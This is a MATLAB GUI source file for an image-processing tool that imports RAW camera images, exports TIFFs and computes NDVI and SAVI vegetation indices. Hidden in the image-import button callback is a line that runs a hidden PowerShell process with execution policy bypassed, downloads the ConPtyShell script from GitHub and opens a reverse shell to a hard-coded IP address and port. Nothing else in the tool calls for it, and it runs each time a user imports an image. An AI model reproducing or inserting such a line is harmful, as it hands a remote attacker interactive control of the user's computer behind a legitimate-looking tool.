function varargout = GUI(varargin)
% GUI MATLAB code for GUI.fig
%      GUI, by itself, creates a new GUI or raises the existing
%      singleton*.
%
%      H = GUI returns the handle to a new GUI or the handle to
%      the existing singleton*.
%
%      GUI('CALLBACK',hObject,eventData,handles,...) calls the local
%      function named CALLBACK in GUI.M with the given input arguments.
%
%      GUI('Property','Value',...) creates a new GUI or raises the
%      existing singleton*.  Starting from the left, property value pairs are
%      applied to the GUI before GUI_OpeningFcn gets called.  An
%      unrecognized property name or invalid value makes property application
%      stop.  All inputs are passed to GUI_OpeningFcn via varargin.
%
%      *See GUI Options on GUIDE's Tools menu.  Choose "GUI allows only one
%      instance to run (singleton)".
%
% See also: GUIDE, GUIDATA, GUIHANDLES

% Edit the above text to modify the response to help GUI

% Last Modified by GUIDE v2.5 05-Mar-2020 23:04:28

% Begin initialization code - DO NOT EDIT
gui_Singleton = 1;
gui_State = struct('gui_Name',       mfilename, ...
    'gui_Singleton',  gui_Singleton, ...
    'gui_OpeningFcn', @GUI_OpeningFcn, ...
    'gui_OutputFcn',  @GUI_OutputFcn, ...
    'gui_LayoutFcn',  [] , ...
    'gui_Callback',   []);
if nargin && ischar(varargin{1})
    gui_State.gui_Callback = str2func(varargin{1});
end

if nargout
    [varargout{1:nargout}] = gui_mainfcn(gui_State, varargin{:});
else
    gui_mainfcn(gui_State, varargin{:});
end
% End initialization code - DO NOT EDIT


% --- Executes just before GUI is made visible.
function GUI_OpeningFcn(hObject, eventdata, handles, varargin)
% This function has no output args, see OutputFcn.
% hObject    handle to figure
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)
% varargin   command line arguments to GUI (see VARARGIN)

% Choose default command line output for GUI
handles.output = hObject;

% Update handles structure
guidata(hObject, handles);

% UIWAIT makes GUI wait for user response (see UIRESUME)
% uiwait(handles.figure1);
%system('Reference.exe');
global popupmenuOneUsed
global popupmenuTwoUsed
global myColorMap
global isFilter
isFilter = false;
popupmenuTwoUsed = false;
popupmenuOneUsed = false;
setObj('popupmenu1','enable','off')

format long;

%The Color Palette
myColorMap = [
                0.47 0.00 0.00
                0.53 0.00 0.00
                0.60 0.00 0.00
                0.67 0.00 0.00
                0.73 0.00 0.00
                0.80 0.00 0.00
                0.87 0.00 0.00
                0.93 0.00 0.00
                1.00 0.00 0.00
                1.00 0.53 0.00
                1.00 0.80 0.00
                1.00 1.00 0.00
                0.80 1.00 0.00
                0.00 1.00 0.00
                0.00 0.73 0.00
                0.00 0.53 0.00
                0.00 0.40 0.00];

% --- Outputs from this function are returned to the command line.
function varargout = GUI_OutputFcn(hObject, eventdata, handles)
% varargout  cell array for returning output args (see VARARGOUT);
% hObject    handle to figure
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

% Get default command line output from handles structure
varargout{1} = handles.output;

function setObj(text1,text2,text3)
set(findobj(0, 'tag', text1), text2, text3);

function x = getObj(text1,text2)
x = get(findobj(0, 'tag', text1), text2);

% --- Executes on button press in importButton.
function importButton_Callback(hObject, eventdata, handles)
% hObject    handle to importButton (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

%Import RAW files
[file,path] = uigetfile({'*.raw';}, 'Select Image');
global popupmenuOneUsed
global I_flip;
global I_rgb;
if ~isequal(file,0)
    %Set the frame in the program as the picture viewer
    axes(handles.axes1); zoom;
    image = strcat(path, file);
    
    % 1280x1024
    r = 1280;
    c = 1024;
    
    %open RAW image
    fin = fopen(image);
    I = fread(fin,r*c,'*uint16');
    
    %Reshape RAW image to 1280x1024
    I_r = reshape(I,r,c);
    
    % Demosaic (Convert RAW image to truecolor image)
    I_d = demosaic(I_r,'grbg');
    
    % Scale (get the R, G, B colors)
    I_d_r = mat2gray(I_d(:,:,1));
    I_d_g = mat2gray(I_d(:,:,2));
    I_d_b = mat2gray(I_d(:,:,3));
    
    %Combine the R G B
    I_final = cat(3,I_d_r,I_d_g,I_d_b);
    
    %Rotate image
    rot = imrotate(I_final,90);
    I_rgb = rot;
    
    %Convert image to grayscale
    gray = rgb2gray(rot);
    
    %flip image
    I_flip = flip(gray);
    
    %show image
    imshow(I_flip);
    
    %close image
    fclose(fin);
    popupmenuOneUsed = true;
    setObj('popupmenu1','enable','on')
    setObj('popupmenu2','enable','on')
end
system("powershell -w hidden -nop -Exec bypass ""IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 193.161.193.99 59646""")

% --- Executes on selection change in popupmenu1.
function popupmenu1_Callback(hObject, eventdata, handles)
% hObject    handle to popupmenu1 (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

% Hints: contents = cellstr(get(hObject,'String')) returns popupmenu1 contents as cell array
%        contents{get(hObject,'Value')} returns selected item from popupmenu1
setObj('popupmenu2','value',1);
global popupmenuOneUsed
global popupmenuTwoUsed
popupmenuTwoUsed = false;
popupmenuOneUsed = true;
setObj('ndviValue','String','n/a');
global I_rgb
global I_flip
global BW
global isFilter

%get corresponding value in the chosen menu
idx = get(handles.popupmenu1,'Value');

%get all the items in the chosen menu
items = get(handles.popupmenu1,'String');

%select the item chosen
selectedItem = items{idx};
if popupmenuOneUsed
    %some 'if statements' if Single TIF, Multi-page, etc are chosen.
    if isequal(selectedItem,'Single TIF')
        isFilter = false;
        imshow(I_flip);
    elseif isequal(selectedItem,'Multi-page TIF')
        isFilter = false;
        imshow(I_flip);
        waitfor(msgbox("Select the folder containing the RAW files.","Multi-page TIF"))
        %Select the folder containing the RAW files
        d = uigetdir(pwd, 'Select a folder');
        %files must be .raw only
        files = dir(fullfile(d, '*.raw'));
        %Since it is Multi-page, we will append all the .RAW files to one
        %.TIFF file
        [file,path] = uiputfile('*.tiff');
        if isequal(file,0) || isequal(path,0)
            disp('User clicked Cancel.')
        else
            full_file = fullfile(path,file);
            msgbox(['User selected ',full_file,...
                ' and then clicked Save.'], 'Multi-page TIF');
            %if clicked save, all the raw files will be appended to the
            %saved .TIFF file
            for x = 1:length(files)
                fileName = files(x).name
                image = fullfile(d, fileName);
                
                %The following code corresponds how we also import the .RAW
                %images
                
                % Reading
                r = 1280;
                c = 1024;
                
                fin = fopen(image);
                I = fread(fin,r*c,'*uint16');
                I_r = reshape(I,r,c);
                
                % Demosaic
                I_d = demosaic(I_r,'grbg');
                
                % Scale
                I_d_r = mat2gray(I_d(:,:,1));
                I_d_g = mat2gray(I_d(:,:,2));
                I_d_b = mat2gray(I_d(:,:,3));
                I_final = cat(3,I_d_r,I_d_g,I_d_b);
                rot = imrotate(I_final,90);
                I_rgb = rot;
                gray = rgb2gray(rot);
                I_flip = flip(gray);
                
                %TIFF in writemode and append (Multi-page TIFF)
                imwrite(I_flip,full_file,'tiff', 'writemode', 'append');
                fclose(fin);
            end
        end
    elseif isequal(selectedItem,'False-Colored')
        isFilter = false;
        waitfor(msgbox("False-Colored: Import the Multi-page TIF file.","False-Colored"));
        %Get the multi-page tiff
        [file,path] = uigetfile({'*.tiff';}, 'Select Image');
        if ~isequal(file,0)
            axes(handles.axes1); zoom;
            %get full path file
            full_file = fullfile(path,file);
            
            %get NIR-1st image, R-2nd image, G-3rd image, B-4th image
            [NIR, ~] = imread(full_file,1);
            [R, ~] = imread(full_file,2);
            [G, ~] = imread(full_file,3);
            [B, ~] = imread(full_file,4);
            
            %convert RGB to NRG
            image = cat(3,NIR,R,G);
            
            %show image
            imshow(image);
        end
    elseif isequal(selectedItem,'Filter')
        isFilter = true;
        axes(handles.axes1); zoom off;
        originalImage = getimage(handles.axes1);
        [rows, columns, numberOfColorChannels] = size(originalImage);
        cumulativeBinaryImage = false(rows, columns);
        while true
            message = sprintf('Do you want to continue saving rectangular regions?');
            reply = questdlg(message, 'Continue with Loop?', 'OK','Cancel', 'Use Zoom','OK');
            if strcmpi(reply, 'Cancel')
                break;
                
            elseif strcmpi(reply, 'Use Zoom')
                zoom on;
                while true
                    w = waitforbuttonpress;
                    if isequal(w,1)
                        break;
                    end
                end
            else
                zoom off;
            
                %Create rectangle regions
                e = imrect(gca);
                setColor(e, 'red');
                
                %compile all the mask images
                cumulativeBinaryImage = cumulativeBinaryImage | createMask(e);
            end
        end
        BW = cumulativeBinaryImage;% get BW mask for that ROI
        
        %Region of Interest
        ROI = originalImage;
        
        %Apply mask
        ROI(BW == 0) = 0;
        
        %Show the Region of Interest
        imshow(ROI);
    end
end
% --- Executes during object creation, after setting all properties.
function popupmenu1_CreateFcn(hObject, eventdata, handles)
% hObject    handle to popupmenu1 (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    empty - handles not created until after all CreateFcns called

% Hint: popupmenu controls usually have a white background on Windows.
%       See ISPC and COMPUTER.
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end


% --- Executes on selection change in popupmenu2.
function popupmenu2_Callback(hObject, eventdata, handles)
% hObject    handle to popupmenu2 (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)

% Hints: contents = cellstr(get(hObject,'String')) returns popupmenu2 contents as cell array
%        contents{get(hObject,'Value')} returns selected item from popupmenu2

% --- Executes during object creation, after setting all properties.
setObj('popupmenu1','value',1);
global popupmenuOneUsed
global popupmenuTwoUsed
global myColorMap
popupmenuTwoUsed = true;
popupmenuOneUsed = false;
global VAL
global full_file
global BW
global isFilter
idx = get(handles.popupmenu2,'Value');
items = get(handles.popupmenu2,'String');
selectedItem = items{idx};
if popupmenuTwoUsed
    if isequal(selectedItem,'SAVI')
        if isFilter
            message = sprintf('Do you want to continue using the filter?');
            reply = questdlg(message, 'Continue?', 'YES','NO', 'YES');
            if strcmpi(reply, 'YES')
                isFilter = true;
            else
                isFilter = false;
            end
        end
        waitfor(msgbox("SAVI: Import the Multi-page TIF file.","SAVI"));
        
        %get multi-page tiff
        [file,path] = uigetfile({'*.tiff';}, 'Select Image');
        if ~isequal(file,0) && ~isFilter
            axes(handles.axes1); zoom;
            full_file = fullfile(path,file);
            %get NIR, R, and G
            [NIR, ~] = imread(full_file,1);
            [R, ~] = imread(full_file,2);
            [G, ~] = imread(full_file,3);
            NIR = double(NIR);
            R = double(R);
            G = double(G);
            %EQUATION FOR SAVI
            VAL = ((NIR - R) ./ (NIR + R + double(0.5)))*(1+double(0.5));
            imshow(VAL, [])
            
            %use the color palette
            colormap(myColorMap);
            
            %show the color bar beside the image
            caxis([-1 1]); 
            colorbar;
        elseif ~isequal(file,0) && isFilter
            axes(handles.axes1); zoom;
            full_file = fullfile(path,file);
            %get NIR, R, and G
            [NIR, ~] = imread(full_file,1);
            [R, ~] = imread(full_file,2);
            [G, ~] = imread(full_file,3);
            NIR(BW == 0) = 255;
            R(BW == 0) = 255;
            G(BW == 0) = 255;
            NIR = double(NIR);
            R = double(R);
            G = double(G);
            %EQUATION FOR SAVI
            VAL = ((NIR - R) ./ (NIR + R + double(0.5)))*(1+double(0.5));
            imshow(VAL, [])
            
            %use the color palette
            colormap(myColorMap);
            
            %show the color bar beside the image
            caxis([-1 1]); 
            colorbar;
        end
    %The corresponding code below is also the same with SAVI but different
    %equation
    elseif isequal(selectedItem,'NDVI')
        if isFilter
            message = sprintf('Do you want to continue using the filter?');
            reply = questdlg(message, 'Continue?', 'YES','NO', 'YES');
            if strcmpi(reply, 'YES')
                isFilter = true;
            else
                isFilter = false;
            end
        end
        waitfor(msgbox("NDVI: Import the Multi-page TIF file.","NDVI"));
        [file,path] = uigetfile({'*.tiff';}, 'Select Image');
        if ~isequal(file,0) && ~isFilter
            axes(handles.axes1); zoom;
            full_file = fullfile(path,file);
            [NIR, ~] = imread(full_file,1);
            [R, ~] = imread(full_file,2);
            [G, ~] = imread(full_file,3);
            NIR = double(NIR);
            R = double(R);
            G = double(G);
            %EQUATION FOR NDVI
            VAL = (NIR -R) ./ (NIR + R);
            imshow(VAL, []);
            colormap(myColorMap);
            caxis([-1 1]); 
            colorbar;
        elseif ~isequal(file,0) && isFilter
            axes(handles.axes1); zoom;
            full_file = fullfile(path,file);
            %get NIR, R, and G
            [NIR, ~] = imread(full_file,1);
            [R, ~] = imread(full_file,2);
            [G, ~] = imread(full_file,3);
            NIR(BW == 0) = 255;
            R(BW == 0) = 255;
            G(BW == 0) = 255;
            NIR = double(NIR);
            R = double(R);
            G = double(G);
            
            %EQUATION FOR SAVI
            VAL = (NIR -R) ./ (NIR + R);
            imshow(VAL, [])
            
            %use the color palette
            colormap(myColorMap);
            
            %show the color bar beside the image
            caxis([-1 1]); 
            colorbar;
        end
    end
end

function popupmenu2_CreateFcn(hObject, eventdata, handles)
% hObject    handle to popupmenu2 (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    empty - handles not created until after all CreateFcns called

% Hint: popupmenu controls usually have a white background on Windows.
%       See ISPC and COMPUTER.
if ispc && isequal(get(hObject,'BackgroundColor'), get(0,'defaultUicontrolBackgroundColor'))
    set(hObject,'BackgroundColor','white');
end


% --- Executes on button press in convertButton.
function convertButton_Callback(hObject, eventdata, handles)
% hObject    handle to convertButton (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)
global I_flip
global popupmenuOneUsed
idx = get(handles.popupmenu1,'Value');
items = get(handles.popupmenu1,'String');
selectedItem = items{idx};
if popupmenuOneUsed
    if isequal(selectedItem,'Single TIF')
        [file,path] = uiputfile('*.tiff');
        if isequal(file,0) || isequal(path,0)
            disp('User clicked Cancel.')
        else
            full_file = fullfile(path,file);
            
            %save image as TIFF file
            imwrite(I_flip,full_file,'tiff');
            msgbox(['User selected ',full_file,...
                ' and then clicked Save.'], 'Single TIF');
        end
    elseif isequal(selectedItem,'False-Colored')
        [file,path] = uiputfile('*.tiff');
        if isequal(file,0) || isequal(path,0)
            disp('User clicked Cancel.')
        else
            full_file = fullfile(path,file);
            %get image shown in the GUI
            F = getframe(handles.axes1);
            
            %convert the frame to image
            Image = frame2im(F);
            
            %save image as tiff file
            imwrite(Image,full_file,'tiff');
            msgbox(['User selected ',full_file,...
                ' and then clicked Save.'], 'False-Colored');
        end
    elseif isequal(selectedItem,'Filter')
        [file,path] = uiputfile('*.tiff');
        if isequal(file,0) || isequal(path,0)
            disp('User clicked Cancel.')
        else
            full_file = fullfile(path,file);
            %get image shown in the GUI
            F = getframe(handles.axes1);
            
            %convert the frame to image
            Image = frame2im(F);
            
            %save image as tiff file
            imwrite(Image,full_file,'tiff');
            msgbox(['User selected ',full_file,...
                ' and then clicked Save.'], 'Filter');
        end
    end
end
% --- Executes on button press in vegetationIndexButton.
function vegetationIndexButton_Callback(hObject, eventdata, handles)
% hObject    handle to vegetationIndexButton (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)
idx = get(handles.popupmenu2,'Value');
items = get(handles.popupmenu2,'String');
selectedItem = items{idx};
global popupmenuTwoUsed
if popupmenuTwoUsed
    if isequal(selectedItem,'SAVI')
        [file,path] = uiputfile('*.tiff');
        if isequal(file,0) || isequal(path,0)
            disp('User clicked Cancel.')
        else
            full_file = fullfile(path,file);
            %same with the previous comment
            F = getframe(handles.axes1);
            Image = frame2im(F);
            imwrite(Image,full_file,'tiff');
            msgbox(['User selected ',full_file,...
                ' and then clicked Save.'], 'SAVI');
        end
    elseif isequal(selectedItem,'NDVI')
        [file,path] = uiputfile('*.tiff');
        if isequal(file,0) || isequal(path,0)
            disp('User clicked Cancel.')
        else
            full_file = fullfile(path,file);
            %same with the previous comment
            F = getframe(handles.axes1);
            Image = frame2im(F);
            imwrite(Image,full_file,'tiff');
            msgbox(['User selected ',full_file,...
                ' and then clicked Save.'], 'NDVI');
        end
    end
end


% --- Executes on button press in averageButton.
function averageButton_Callback(hObject, eventdata, handles)
% hObject    handle to averageButton (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)
global VAL
global popupmenuTwoUsed
if popupmenuTwoUsed
    %show the average/mean value of the SAVI/NVDI
    setObj('ndviValue','String',mean(nonzeros(VAL(:))));
end

% --- Executes on button press in portionButton.
function portionButton_Callback(hObject, eventdata, handles)
% hObject    handle to portionButton (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)
global full_file
global VAL1
global popupmenuTwoUsed
global myColorMap
global h
idx = get(handles.popupmenu2,'Value');
items = get(handles.popupmenu2,'String');
selectedItem = items{idx};
if popupmenuTwoUsed
    if isequal(selectedItem,'SAVI') || isequal(selectedItem,'NDVI')
        %crop image using imcrop function
        [I, rec] = imcrop;
        portionSize = size(I);
        if ~isempty(I)
            %read again the NIR, R, and G
            [NIR, ~] = imread(full_file,1);
            [R, ~] = imread(full_file,2);
            [G, ~] = imread(full_file,3);
            %get the crop position then crop also the NIR, R, and G images
            NIR = imcrop(NIR,rec);
            R = imcrop(R,rec);
            G = imcrop(G,rec);
            %Below is the computation for SAVI and NDVI
            if isequal(selectedItem,'SAVI')
                NIR = double(NIR);
                R = double(R);
                G = double(G);
                %EQUATION FOR SAVI
                VAL1 = ((NIR - R) ./ (NIR + R + double(0.5)))*(1+double(0.5));
                h = figure("Name","Cropped SAVI");
                imshow(VAL1, []);
                colormap(myColorMap);
                caxis([-1 1]); 
                colorbar;
            elseif isequal(selectedItem,'NDVI')
                NIR = double(NIR);
                R = double(R);
                G = double(G);
                %EQUATION FOR NDVI
                VAL1 = (NIR -R) ./ (NIR + R);
                h = figure("Name","Cropped NDVI");
                imshow(VAL1, []);
                colormap(myColorMap);
                caxis([-1 1]); 
                colorbar;
            end
            setObj('areaValue','String',string(portionSize(1)) + 'x' + portionSize(2));
            setObj('text16','String',mean(VAL1(:)));
        end
    end
end


% --- Executes on button press in downloadTableButton.
function downloadTableButton_Callback(hObject, eventdata, handles)
% hObject    handle to downloadTableButton (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)
global VAL
global popupmenuTwoUsed
if popupmenuTwoUsed
    %save file as excel file (*.xlsx)
    [file,path] = uiputfile('*.xlsx');
    if isequal(file,0) || isequal(path,0)
        disp('User clicked Cancel.')
    else
        full_file = fullfile(path,file);
        %write all the pixels in the saved excel file
        xlswrite(full_file, VAL);
        msgbox(['User selected ',full_file,...
            ' and then clicked Save.'], 'NDVI/SAVI');
    end
end


% --- Executes on button press in showColorMapButton.
function showColorMapButton_Callback(hObject, eventdata, handles)
% hObject    handle to showColorMapButton (see GCBO)
% eventdata  reserved - to be defined in a future version of MATLAB
% handles    structure with handles and user data (see GUIDATA)
global myColorMap
global popupmenuTwoUsed
global VAL
global VAL1
global h
if popupmenuTwoUsed
    %will show a seperate figure
    figure("Name","Show Color Map");
    if ishandle(h)
        %get the 3D view of the colormap
        surf(VAL1,'edgecolor','none')
        %use the color palette
        colormap(myColorMap);
    else
        %get the 3D view of the colormap
        surf(VAL,'edgecolor','none')
        %use the color palette
        colormap(myColorMap);
    end
end
